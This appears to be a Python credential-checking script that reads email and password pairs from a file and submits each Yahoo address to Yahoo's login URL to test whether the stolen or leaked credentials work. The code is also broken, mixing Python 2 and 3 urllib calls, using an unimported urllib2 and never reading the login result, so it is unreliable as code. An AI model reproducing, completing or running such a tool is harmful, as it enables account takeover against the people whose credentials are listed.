import urllib
from random import choice
import string

def make_request(url, data):
    # Encode the data
    post_data = urllib.urlencode(data)
    # Make request and get the response
    request = urllib2.Request(url, post_data)
    response = urllib2.urlopen(request)
    # The response will contain the pastebin link
    paste_link = response.read()
    return paste_link


def lineFilter(line):
    # remove all spaces
    line = line.replace(' ','')
    # replace seperator: ,  --- develop by removing !@#$%^&*()
    line = line.replace(',','|')
    return line

def randomEncryptKey(length=8):
    chars = 'qwertyuioplkjhgfdsazxcvbnm1234567890'
    return ''.join([choice(chars) for i in range(length)])
'''
def randomEncryptKey(length=8, chars=string.letters + string.digits):
    # example: randomEncryptKey(8,string.digits) or randomEncryptKey(15,string.ascii_letters)
    return ''.join([choice(chars) for i in range(length)])    
'''

def checkYahoo( email, passwd ):
    url = 'http://login.yahoo.com/config/login?.intl=' + randomEncryptKey(15) + '&.src=ym&login=' + email + '&passwd=' + passwd
    # Make request and get the response
    request = urllib.request.urlopen(url, None, 4)
    response = urllib.urlopen(request)
    
def main():
    # Giving the filename, change as needed
    filename = 'mp.txt'

    # Open file to check
    try:
        file = open(filename)
        while 1:
            line = file.readline()
            if not line: break

            # Filtering line
            line = lineFilter(line)
            components = line.split('|')
            print('Checking:', components[0],' with Password:', components[1])

            # Make a Connection to server
            if components[0].find('yahoo') != -1: checkYahoo(components[0], components[1])
            #if components[0].find('gmail') != -1: checkGmail()
            
    except IOError:
        print('File cannot be found. Make sure file name is mp.txt')
    
if __name__ == '__main__':
    main()

